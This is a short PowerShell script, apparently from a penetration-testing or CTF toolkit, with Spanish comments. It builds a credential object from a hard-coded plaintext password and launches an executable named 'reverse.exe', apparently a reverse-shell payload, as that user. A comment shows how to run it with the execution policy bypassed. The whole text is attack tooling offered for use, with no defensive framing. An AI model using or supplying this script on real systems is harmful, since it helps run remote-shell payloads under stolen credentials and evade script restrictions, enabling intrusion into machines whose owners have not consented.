$secpasswd = ConvertTo-SecureString "MiPassword" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("UserName", $secpasswd)
$computer = "MyHostname"
$script = "C:\ACCESSIBLE\PATH\reverse.exe"
Start-Process -FilePath $script -WorkingDirectory "C:\ACCESSIBLE\PATH"  -Credential $mycreds

##
## Ejecutar: 
## cmd> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
